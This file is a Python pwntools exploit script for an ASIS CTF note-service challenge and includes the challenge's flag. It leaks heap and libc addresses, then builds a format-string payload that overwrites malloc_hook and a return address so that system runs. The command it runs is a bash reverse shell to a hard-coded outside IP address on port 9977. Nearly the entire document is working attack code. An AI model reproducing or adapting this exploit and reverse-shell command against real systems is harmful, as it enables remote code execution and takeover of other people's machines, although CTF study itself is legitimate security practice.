#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
from pwn import *

#host = "10.211.55.28"
#ASIS{W3LC0M3_T0_AS1S_F1N4L_R0UND_:D}
host = "alegria.asis-ctf.ir"
port = 8282

r = remote(host,port)

def login(name,pw):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(pw)

def add_note(title_len,content_len,title,content):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(title_len))
    r.recvuntil(":")
    r.sendline(str(content_len))
    r.recvuntil(":")
    time.sleep(0.1)
    r.sendline(title)
    time.sleep(0.1)
    r.recvuntil(":")
    r.sendline(content)

def view():
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("Title:")
    data = r.recvuntil("1. take")
    return data

def clear():
    r.recvuntil(">")
    r.sendline("3")

def logout():
    r.recvuntil(">")
    r.sendline("4")
login("","")
add_note(-1,2,"","a")
#r.recvuntil(">")
data = view()
heap = u32(data[24+1:28+1]) - 0x58 
libc = u32(data[0x9c+1:0xa0+1]) - 0x1b2a20
print "heap:",hex(heap)
print "libc:",hex(libc)
clear()
logout()
heap = 0x99bf000
libc = 0xf7380000
login("ddaa","dada")
clear()
environ = libc + 0x1b3ddc
payload = "%285$pqq"
add_note(52,512,"bash -c 'bash>&/dev/tcp/140.115.59.13/9977 0>&1'\x00",payload)
logout()
login("ddaa","dada")
data = view()
stack =  int(data.split("Content:")[1].split("qq")[0].strip(),16)
print "stack:",hex(stack)
ret = stack-0x638+4+0x154
clear()
malloc_hook = libc + 0x1b2768
system = libc + 0x3ad80
arg = ret+8
cmd = heap + 0xb98
magic = 0x804a1c7
payload = p32(malloc_hook)
payload += p32(malloc_hook+1)
payload += p32(malloc_hook+2)
payload += p32(malloc_hook+3)
payload += p32(ret)
payload += p32(ret+1)
payload += p32(ret+2)
payload += p32(ret+3)
payload += p32(arg)
payload += p32(arg+1)
payload += p32(arg+2)
payload += p32(arg+3)


prev = 48
for i in range(4):
    payload += fmtchar(prev,(magic >>i*8) & 0xff,3+i)
    prev = (magic >>i*8) & 0xff
for i in range(4):
    payload += fmtchar(prev,(system >> i*8) & 0xff,7+i)
    prev = (system >> i*8) & 0xff
for i in range(4):
    payload += fmtchar(prev,(cmd >> i*8) & 0xff,11+i)
    prev = (cmd >> i*8) & 0xff

add_note(52,512,"bash -c 'bash>&/dev/tcp/140.115.59.13/9977 0>&1'\x00",payload)

r.interactive()

